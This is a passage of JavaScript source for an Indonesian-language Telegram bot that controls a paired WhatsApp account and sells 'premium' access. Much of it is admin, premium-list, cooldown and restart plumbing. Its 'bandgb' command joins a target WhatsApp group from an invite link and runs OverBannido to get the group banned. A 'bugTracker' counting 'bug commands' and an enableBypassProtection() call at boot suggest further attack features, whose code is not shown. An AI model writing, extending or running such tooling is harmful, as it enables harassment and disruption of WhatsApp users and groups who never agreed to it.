bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    // sudah ada
    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});


// ===============================
// UNBLOCK CMD GROUP
// ===============================

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("approved", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa approve group.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /approved -100xxxxxxxxxx");
  }

  if (isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini sudah di-approve.");
  }

  approvedGroups.push(String(chatId));
  saveApprovedGroups();

  if (pendingGroups.has(String(chatId))) {
    clearTimeout(pendingGroups.get(String(chatId)).timeout);
    pendingGroups.delete(String(chatId));
  }

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "✅ Group ini telah di-approve oleh owner. Bot sekarang aktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Group ${chatId} berhasil di-approve.`);
});

bot.command("unapproved", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa mencabut approve.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const chatId = args[0];

  if (!chatId) {
    return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
  }

  if (!isGroupApproved(chatId)) {
    return ctx.reply("⚠️ Group ini belum di-approve.");
  }

  approvedGroups = approvedGroups.filter((id) => id !== String(chatId));
  saveApprovedGroups();

  try {
    await ctx.telegram.sendMessage(
      chatId,
      "⚠️ Approval group ini dicabut oleh owner. Bot akan nonaktif di sini."
    );
  } catch (e) {}

  return ctx.reply(`✅ Approval group ${chatId} berhasil dicabut.`);
});

bot.command("listapprovedgroup", async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Hanya owner yang bisa melihat daftar.");
  }

  if (approvedGroups.length === 0) {
    return ctx.reply("📭 Belum ada group yang di-approve.");
  }

  const text = approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n");
  return ctx.reply(`📋 Daftar group approved:\n\n${text}`);
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
// ===== COMMAND UPDATE (OWNER ONLY) =====
bot.command("update", checkOwner, async (ctx) => {
  await performUpdate(ctx);
});

// ===== COMMAND CEK VERSI (OWNER ONLY) =====
bot.command("version", checkOwner, async (ctx) => {
  try {
    const res = await axios.get(UPDATE_URL, {
      headers: UPDATE_HEADERS,
      timeout: 15000,
      responseType: "text",
    });
    const remoteContent = res.data;
    const localContent = fs.readFileSync(UPDATE_FILE_PATH, "utf8");

    const hash = (s) => crypto.createHash("md5").update(s).digest("hex");
    const isLatest = hash(remoteContent) === hash(localContent);

    await ctx.replyWithMarkdown(
      `🤖 *INFO VERSI BOT*\n\n` +
        `📦 Lokal  : \`${hash(localContent).slice(0, 8)}\`\n` +
        `☁️ Remote : \`${hash(remoteContent).slice(0, 8)}\`\n\n` +
        `Status : ${isLatest ? "✅ Versi terbaru" : "⚠️ Ada update tersedia"}\n\n` +
        `Gunakan /update untuk update manual.`
    );
  } catch (err) {
    await ctx.reply(`❌ Gagal cek versi: ${err.message}`);
  }
});

bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});


////=========PREMIUM GROUP========\\\\

const premiumGroupFile = './premiumGroups.json';
let premiumGroups = loadJSON(premiumGroupFile) || [];

// Helper cek apakah group premium
function isGroupPremium(chatId) {
  return premiumGroups.includes(chatId.toString());
}

// Daftarkan group jadi premium
bot.command('addpremgroup', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id.toString();

  if (isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group ini sudah
│             terdaftar premium!
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups.push(chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
│ ◈ STATUS  : ✅ Berhasil
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ✨ Premium Aktif
│
│  Semua member di group ini
│  sekarang bisa akses fitur
│  premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

// Hapus group dari premium
bot.command('delpremgroup', checkOwner, async (ctx) => {
  const chatId = ctx.chat.id.toString();

  if (!isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ❌ Gagal
│ ◈ REASON  : Group ini bukan
│             group premium!
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups = premiumGroups.filter(id => id !== chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
    caption: `\`\`\`javascript
┏━━━〔  𝕽 𝕬 𝕱 𝕬 𝕰 𝕷  〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
│ ◈ STATUS  : 🚫 Dihapus
│ ◈ GROUP   : ${ctx.chat.title}
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ❌ Dicabut
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

// Tambah group lain jadi premium via ID (dari private)
bot.command('addpremgroupid', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
      caption: `\`\`\`javascript
┏━━━〔  𝕽 𝕬 𝕱 𝕬 𝕰 𝕷  〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Format salah!
│
│  Contoh penggunaan:
│  /addpremgroupid -100xxx
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const chatId = args[0].toString();

  if (isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group sudah premium!
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups.push(chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 〕───╮
│ ◈ STATUS  : ✅ Berhasil
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ✨ Premium Aktif
│
│  Group berhasil didaftarkan
│  sebagai premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});
// Hapus group lain dari premium via ID
bot.command('delpremgroupid', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);

  if (!args[0]) {
    return ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Format salah!
│
│  Contoh penggunaan:
│  /delpremgroupid -100xxx
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const chatId = args[0].toString();

  if (!isGroupPremium(chatId)) {
    return ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐄𝐑𝐑𝐎𝐑 〕───╮
│ ◈ STATUS  : ⚠️ Gagal
│ ◈ REASON  : Group bukan
│             group premium!
│ ◈ ID      : ${chatId}
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  premiumGroups = premiumGroups.filter(id => id !== chatId);
  saveJSON(premiumGroupFile, premiumGroups);

  await ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐃𝐄𝐋𝐄𝐓𝐄𝐃 〕───╮
│ ◈ STATUS  : 🚫 Dihapus
│ ◈ ID      : ${chatId}
│ ◈ AKSES   : ❌ Dicabut
│
│  Group berhasil dihapus
│  dari daftar premium!
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

// Command manual untuk cek / kelola mode rest
bot.command("rest", checkOwner, async (ctx) => {
  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();

  if (arg === 'on') {
    await startRestMode();
    return ctx.reply('🛑 Mode REST diaktifkan manual.');
  }

  if (arg === 'off') {
    if (bugTracker.restTimer) clearTimeout(bugTracker.restTimer);
    if (bugTracker.windowTimer) clearTimeout(bugTracker.windowTimer);
    bugTracker.isResting = false;
    bugTracker.count = 0;
    bugTracker.firstBugTime = null;
    bugTracker.restUntil = null;
    return ctx.reply('✅ Mode REST dimatikan manual.');
  }

  // Status
  if (bugTracker.isResting) {
    const sisaMs = bugTracker.restUntil - Date.now();
    const sisaMenit = Math.floor(sisaMs / 60000);
    const sisaDetik = Math.floor((sisaMs % 60000) / 1000);
    return ctx.reply(
      `🛑 *STATUS: REST AKTIF*\n\n` +
      `⏳ Sisa : *${sisaMenit}m ${sisaDetik}s*\n` +
      `📊 Bug Count : *${bugTracker.count}/${BUG_REST_CONFIG.MAX_BUG_COMMANDS}*`,
      { parse_mode: 'Markdown' }
    );
  }

  return ctx.reply(
    `✅ *STATUS: NORMAL*\n\n` +
    `📊 Bug Count : *${bugTracker.count}/${BUG_REST_CONFIG.MAX_BUG_COMMANDS}*\n` +
    `⏱️ Window : 5 menit\n\n` +
    `Gunakan:\n` +
    `• \`/rest on\` — aktifkan manual\n` +
    `• \`/rest off\` — matikan manual`,
    { parse_mode: 'Markdown' }
  );
});
////=========LIST PREM GROUP========\\\\
bot.command('listpremgroup', checkOwner, async (ctx) => {
  if (premiumGroups.length === 0) {
    return ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
      caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐋𝐈𝐒𝐓 〕───╮
│ ◈ STATUS  : ⚠️ Kosong
│ ◈ REASON  : Belum ada group
│             yang terdaftar
│             premium!
╰──────────────────────╯
\`\`\``,
      parse_mode: 'Markdown'
    });
  }

  const list = premiumGroups.map((id, i) => `│ ${i + 1}. ${id}`).join('\n');

  await ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐋𝐈𝐒𝐓 𝐆𝐑𝐎𝐔𝐏 〕───╮
│ ◈ TOTAL : ${premiumGroups.length} Group
├──────────────────────
${list}
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});

////=========CEK PREM GROUP========\\\\
bot.command('cekpremgroup', async (ctx) => {
  const chatId = ctx.chat.id.toString();
  const status = isGroupPremium(chatId);

  await ctx.replyWithPhoto('https://files.catbox.moe/hd29if.jpg', {
    caption: `\`\`\`javascript
┏━━━〔 𝕽 𝕬 𝕱 𝕬 𝕰 𝕷 〕━━━┓
   >> PREMIUM GROUP SYSTEM <<
┗━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐓𝐀𝐓𝐔𝐒 〕───╮
│ ◈ GROUP   : ${ctx.chat.title || '-'}
│ ◈ ID      : ${chatId}
│ ◈ PREMIUM : ${status ? '✅ Aktif' : '❌ Tidak Aktif'}
╰──────────────────────╯
\`\`\``,
    parse_mode: 'Markdown'
  });
});
// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "RAFAELAA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/bronsew" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////=========COOLDOWN SYSTEM========\\\\

bot.command("setcd", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds;
    saveCooldown(seconds);
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

// ================== RESTART PANEL (SUPERVISOR MODE) ==================
bot.command("restart", checkOwner, async (ctx) => {
  const startTime = Date.now();

  // Kirim konfirmasi
  const msg = await ctx.reply(
    "⏳ 🔄 *Merestart panel...*\n\n" +
    "_Bot akan online kembali dalam 3-5 detik._",
    { parse_mode: "Markdown" }
  );

  console.log(chalk.yellow.bold("\n[SUPERVISOR-RESTART] Owner trigger restart..."));
  console.log(chalk.yellow(`[SUPERVISOR-RESTART] By   : ${ctx.from.id} (${ctx.from.username || 'no username'})`));
  console.log(chalk.yellow(`[SUPERVISOR-RESTART] Time : ${formatDateTime(new Date())}`));

  // Notif ke log group (opsional)
  if (LOG_GROUP_ID) {
    try {
      await ctx.telegram.sendMessage(
        LOG_GROUP_ID,
        `🔄 *PANEL RESTART TRIGGERED*\n\n` +
        `👤 Owner : ${ctx.from.username ? '@' + ctx.from.username : ctx.from.id}\n` +
        `📅 Time  : ${formatDateTime(new Date())}\n` +
        `🖥️ Mode  : Supervisor (auto-restart built-in)`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {
      console.error('[RESTART] Gagal kirim log:', e.message);
    }
  }

  // Cleanup socket WhatsApp (biar sesi WA nggak conflict)
  try {
    isWhatsAppConnected = false;
    isReconnecting = false;

    if (sock) {
      try { sock.ev.removeAllListeners(); } catch {}
      try { sock.ws?.close(); } catch {}
      try { sock.end?.(undefined); } catch {}
      sock = null;
    }
    console.log(chalk.green("[RESTART] Socket WA di-cleanup."));
  } catch (e) {
    console.error('[RESTART] Cleanup socket error:', e.message);
  }

  // ❌ JANGAN pakai bot.stop() — bikin lock Telegram nyangkut
  // ✅ Cukup flush updates terakhir
  try {
    // Tidak ada bot.stop() di sini
    console.log(chalk.green("[RESTART] Bot Telegram disiapkan untuk restart."));
  } catch (e) {}

  // Delay singkat biar pesan terkirim dulu
  setTimeout(() => {
    const durasi = ((Date.now() - startTime) / 1000).toFixed(1);
    console.log(chalk.red.bold(
      `\n[SUPERVISOR-RESTART] Exit dengan code 42 (uptime ${durasi}s).\n` +
      `[SUPERVISOR-RESTART] Supervisor akan spawn ulang dalam 2 detik...\n`
    ));

    // ⭐ EXIT CODE 42 → SUPERVISOR DETEKSI & RESTART CEPAT (2 DETIK)
    process.exit(42);
  }, 1500);
});
////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "🟢 Connect"
      : "🔴 No Connect";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

bot.command("bandgb", checkPremium, checkCommandEnabled, checkCooldown, checkWhatsAppConnection, async (ctx) => {
  // Mengambil argumen (link group)
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply(`Example: /bandgb https://chat.whatsapp.com/CodeGroup`);

  // Regex untuk mengambil kode undangan dari link WhatsApp group
  const gcRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]{22,24})/;
  const match = args.match(gcRegex);

  if (!match) return ctx.reply(`❌ Link group tidak valid! Masukkan link chat.whatsapp.com yang benar.`);
  const inviteCode = match[1];

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode); 
    
    if (!groupJid) {
      return ctx.reply(`❌ Gagal masuk ke grup. Pastikan bot belum dibanned dari grup tersebut atau link belum kedaluwarsa.`);
    }

    await ctx.reply(`
✘ 𝚂𝙰𝙻𝚅𝙰𝙳𝙾𝚁 𝙶𝚁𝙾𝚄𝙿 BANNED ✘
♛ Success Banned Group
♛ Metode    : Add Num`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK GROUP ☚", url: args }],
          ]
        }
      }
    );

    // Menjalankan fungsi secara asynchronous tanpa perulangan/loop
    (async () => {
      await OverBannido(sock, groupJid);
    })();

  } catch (error) {
    console.error(error);
    return ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
  }
});

// ============================================================
setInterval(() => {
  if (!isWhatsAppConnected || !sock) return;
  const idle = Date.now() - lastActivity;

  // Idle > 5 menit DAN queue kosong → cek koneksi
  if (idle > 5 * 60 * 1000 && sendQueue.length === 0) {
    console.log(chalk.yellow('[WATCHDOG] Idle >5 menit, ping socket...'));
    try {
      sock.sendPresenceUpdate('available').catch(() => {});
      lastActivity = Date.now();
    } catch (e) {
      console.log(chalk.red('[WATCHDOG] Socket tidak responsif! Restart...'));
      isWhatsAppConnected = false;
      isReconnecting = false;
      try { sock?.ws?.close?.(); } catch {}
      sock = null;
      setTimeout(() => startSesi().catch(() => {}), 3000);
    }
  }
}, 60000);

// ============================================================
// ENTRY POINT — Parent (supervisor) atau Child (bot asli)
// ============================================================
if (!IS_CHILD) {
  // ===== PARENT (supervisor) =====
  console.log(chalk.magenta.bold(`
╔═══════════════════════════════╗
║   RAFAEL BOT — SUPERVISOR     ║
║   Auto-restart: AKTIF ✅      ║
╚═══════════════════════════════╝
`));
  runSupervisor();
} else {
  // ===== CHILD (bot asli) =====
  (async () => {
    console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

    try {
      enableBypassProtection();  // ← TAMBAHKAN INI
      await startSesi();
      await bot.launch();
      startUpdateChecker();
    } catch (err) {
      console.error(chalk.red(`[BOOT] Gagal start: ${err.message}`));
      process.exit(1);
    }
  })();
}